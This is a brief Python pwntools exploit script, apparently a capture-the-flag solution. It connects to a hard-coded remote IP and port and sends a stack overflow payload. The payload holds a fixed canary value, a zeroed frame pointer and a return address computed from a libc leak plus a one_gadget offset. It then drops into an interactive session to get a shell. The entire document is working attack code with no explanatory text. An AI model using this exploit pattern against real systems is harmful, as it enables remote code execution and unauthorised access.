from pwn import *

io = remote('34.76.152.107', 8204)

one = 0x4e8a0
libc_call_main = 0x23a90

gud = 0x7f644fb1aa90 - libc_call_main + one

payload = b'i'*56 + p64(0x1f757615b1138300) + p64(0) + p64(gud)
io.send(payload)
io.interactive()